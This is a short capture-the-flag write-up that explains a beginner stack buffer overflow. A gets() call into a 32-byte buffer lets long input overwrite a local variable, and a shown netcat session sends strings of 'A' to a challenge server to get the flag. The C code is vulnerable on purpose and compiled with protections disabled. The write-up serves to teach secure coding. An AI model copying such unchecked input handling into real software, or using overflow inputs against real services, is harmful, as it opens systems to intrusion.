Notice that the program will read the flag from a file if we somehow manage to break from the `while(1)` loop.

We also notice that if `x!=0`, the code will exit the "infinite" loop:

```C
int main() {
    while(1) {
        int x = 0;
        char name[32]="";
        printf("What's your name? ");

        // ...
        
        gets(name);    

        if(x) {
            break; // EXIT the loop
        } 

        // ...
    }

    // read flag from file
    // ...
    
    return 0;
}
```

But how can we set x to something different from 0 **in a compiled program**?

When we compile this using `gcc main.c -o main -std=c99 -fno-stack-protector -z execstack -no-pie`, we actually get a hint:

```bash
main.c: In function ‘main’:
main.c:13:9: warning: ‘gets’ is deprecated [-Wdeprecated-declarations]
   13 |         gets(name);
      |         ^~~~
In file included from main.c:4:
/usr/include/stdio.h:667:14: note: declared here
  667 | extern char *gets (char *__s) __wur __attribute_deprecated__;
      |              ^~~~
/usr/bin/ld: /tmp/ccs4hMd1.o: in function `main':
main.c:(.text+0x5e): warning: the `gets' function is dangerous and should not be used.
```

So the `gets()` function is considered dangerous. What does that mean?

If we search the internet, we find out that `gets` is unsafe since it doesn't check the input length when saving it to a buffer. In other words, it can copy, say, a 100 character long string in a 32 bytes array (100 and 32 are arbitrary number, anything similar proves the point). This is also known as a **Buffer Overflow**, since the remaining `100-32=68 bytes` override other variables in our program's memory, including `x`.

So, if we provide a string long enough to override x (but short enough to not override other important variables that will crash the program), we'll successfully retrieve the flag:

```bash
vianuhack@computer:~$ nc 164.92.224.165 1337
What's your name? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
What's your name? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
What's your name? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Congrats! You bypassed it!
Here's your flag: VianuCTF{PWN3D_TH1S_INTRO_B0F!}

vianuhack@computer:~$ 
```

This is why it's always important to address out-of-bounds array issues (signal 11) when coding in C/C++. While `gets()` is deprecated, there are many other places where issues like this can arise. 
